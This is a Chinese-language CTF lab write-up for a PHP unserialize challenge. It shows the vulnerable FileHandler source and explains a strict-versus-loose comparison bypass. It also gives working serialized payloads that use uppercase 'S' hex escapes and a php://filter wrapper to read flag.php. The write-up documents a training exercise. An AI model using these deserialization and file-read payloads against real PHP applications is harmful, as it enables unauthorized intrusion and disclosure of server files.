![[Pasted image 20221104081222.png]]
好一个一语双关
```php
<?php
include("flag.php");
highlight_file(__FILE__);
class FileHandler
{
	protected $op;
	protected $filename;
	protected $content;
	function __construct()
	{
		$op = "1";
		$filename = "/tmp/tmpfile";
		$content = "Hello World!";
		$this->process();
	}
	public function process()
	{
		if($this->op == "1")
		{
			$this->write();
		}
		else if($this->op == "2")
		{
			$res = $this->read();
			$this->output($res);
		}
		else
		{
			$this->output("Bad Hacker!");
		}
	}
	private function write()
	{
		if(isset($this->filename) && isset($this->content))
		{
			if(strlen((string)$this->content) > 100)
			{
				$this->output("Too long!");
				die();
			}
			$res = file_put_contents($this->filename,
									 $this->content);
			if($res)
			{
				$this->output("Successful!");
			}
			else 
			{
				$this->output("Failed!");
			}
		}
		else
		{
			$this->output("Failed!");
		}
	}
	private function read()
	{
		$res = "";
		if(isset($this->filename))
		{
			$res = file_get_contents($this->filename);
		}
		return $res;
	}
	private function output($s)
	{
		echo "[Result]: <br>";
		echo $s;
	}
	function __destruct()
	{
		if($this->op === "2")
		{
			$this->op = "1";
		}
		$this->content = "";
		$this->process();
	}
}

function is_valid($s)
{
	for($i = 0; $i < strlen($s); $i++)
	{
		if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
		{
			return false;
		}
	}
	return true;
}

if(isset($_GET{'str'}))
{
	$str = (string)$_GET['str'];
	if(is_valid($str))
	{
		$obj = unserialize($str);
	}
}
```
注意到
```php
function __destruct()
{
	if($this->op === "2")
	{
		$this->op = "1";
	}
	$this->content = "";
	$this->process();
}
```
`__destruct`方法中`$this->op`与`"2"`的比较是强类型比较
而
```php
public function process()
{
	if($this->op == "1")
	{
		$this->write();
	}
	else if($this->op == "2")
	{
		$res = $this->read();
		$this->output($res);
	}
	else
	{
		$this->output("Bad Hacker!");
	}
}
```
`process`方法中`$this->op`与`"1"`和`"2"`的比较是[[弱类型比较绕过|弱类型比较]]
可利用这一点绕过`__deconstruct`的限制
```php
/?str=O:11:"FileHandler":3:{s:5:"%00*%00op";i:2;s:11:"%00*%00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:"%00*%00content";s:3:"123";}
```
发现并没有反应，原来是`%00`被`is_valid`拦截了，搜索发现可通过将序列化文本中的`s`改为`S`来支持16进制转义
```php
/?str=O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";S:10:"\00*\00content";s:3:"123";}
```
![[Pasted image 20221104092901.png]]
![[Pasted image 20221104093055.png]]
#Web #反序列化 #PHP #绕过 #LFI